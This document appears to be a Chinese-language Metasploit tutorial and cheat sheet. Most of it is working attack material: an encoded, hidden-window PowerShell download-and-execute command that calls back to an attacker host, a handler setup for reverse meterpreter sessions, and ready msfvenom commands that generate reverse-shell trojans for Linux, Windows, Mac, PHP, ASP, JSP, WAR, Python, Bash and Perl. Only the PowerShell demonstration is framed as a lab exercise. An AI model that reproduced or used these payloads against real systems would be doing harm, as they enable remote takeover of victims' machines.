# MSF

## msfconsole常规用法

终端输入msfconsole

![image-20231212184225001](http://111.229.225.13:81/i/2023/12/12/ugt88t-2.png)

### 通过命令执行连接对方主机 

使用exploit/multi/script/web_delivery 模块

```
use exploit/multi/script/web_delivery
```

![image-20231212185138427](http://111.229.225.13:81/i/2023/12/12/um9cdj-2.png)

进入模块后可以使用以下命令，进行攻击的配置

```bash
show targets #查看可选择的目标类型
set target 对应编号|目标类型 #设置攻击目标
show payloads #查看可利用的payload，在选择完target后可显示对应的payload
set payload 对应编号|目标类型 #设置攻击载荷
show options #显示利用模块，所需参数，以及目前设置的参数
set lhost #设置服务器ip 填自己主机的 反向连接时需要
set lport #设置服务器端口
set rhost #设置目标主机ip
set rport #设置目标主机端口 
run / expliot #运行模块
```

这里演示一下对windows的攻击，**前提是需要在目标主机上可以命令执行**

攻击主机kali:192.168.52.128       靶机windows11

![image-20231212190346833](http://111.229.225.13:81/i/2023/12/12/vh9hhn-2.png)

![image-20231212190404943](http://111.229.225.13:81/i/2023/12/12/vhm1xj-2.png)

复制上面显示的这段命令

```powershell
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB4AEcAWgA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB4AEcAWgAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHgARwBaAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAMgAuADEAMgA4ADoAOAAwADgAMAAvAGIATQBXAHMAdwBZAHMATABhAFkAagBEAC8AQQBXAEUAMQBvAHkARwBTAEkAcQBlAGIAagB2ACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQAyAC4AMQAyADgAOgA4ADAAOAAwAC8AYgBNAFcAcwB3AFkAcwBMAGEAWQBqAEQAJwApACkAOwA=
```

目标主机运行

![image-20231212190519127](http://111.229.225.13:81/i/2023/12/12/viac4a-2.png)

![image-20231212190702730](http://111.229.225.13:81/i/2023/12/12/vjdzy5-2.png)

![image-20231212190718234](http://111.229.225.13:81/i/2023/12/12/vjh6wz-2.png)

这里运行后，可能会卡住，直接摁回车

然后输入sessions 即可以查看是否成功控制目标主机

![image-20231212190918157](http://111.229.225.13:81/i/2023/12/12/vko162-2.png)

关于session相关命令

```bash
show sessions | sessions #显示获取的所有会话
sessions -i 对应的会话id #使用此会话，并且进入meterpreter后渗透模块
进入meterpreter 切记不要随便使用exit离开,会导致会话直接消失
可以使用background 进行后台运行sessions #后台运行sessions
```

### 结合Msfvenom模块进行后门攻击

exploit/multi/handler模块 eg.这里依然以windows举例

```bash
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.52.128
set lport 1111
exploit -z -j#后台执行
```

前提是利用Msfvenom生成木马，并且在目标主机上执行此木马

这里不举例了，想看例子的可以查看这篇[msf生成木马_msfvenom -p linux/x86/meterpreter/reverse_tcp lhos-CSDN博客](https://blog.csdn.net/liu_jia_liang/article/details/123661388?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-123661388-blog-102676735.235^v39^pc_relevant_3m_sort_dl_base2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-123661388-blog-102676735.235^v39^pc_relevant_3m_sort_dl_base2&utm_relevant_index=1)

博客



## Msfvenom生成木马

### 常用命令生成木马

Linux

```bash
　　msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=< Your Port to Connect On> -f elf > shell.elf
```

Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

Mac

```bash
　msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.machoWeb Payloads
```

PHP

```bash
　　msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

ASP

```bash
　msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

WAR

```bash
　msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
Scripting Payloads
```

Python

```bash
　　msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

Bash

```bash
　　msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

Perl

```bash
　　msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```







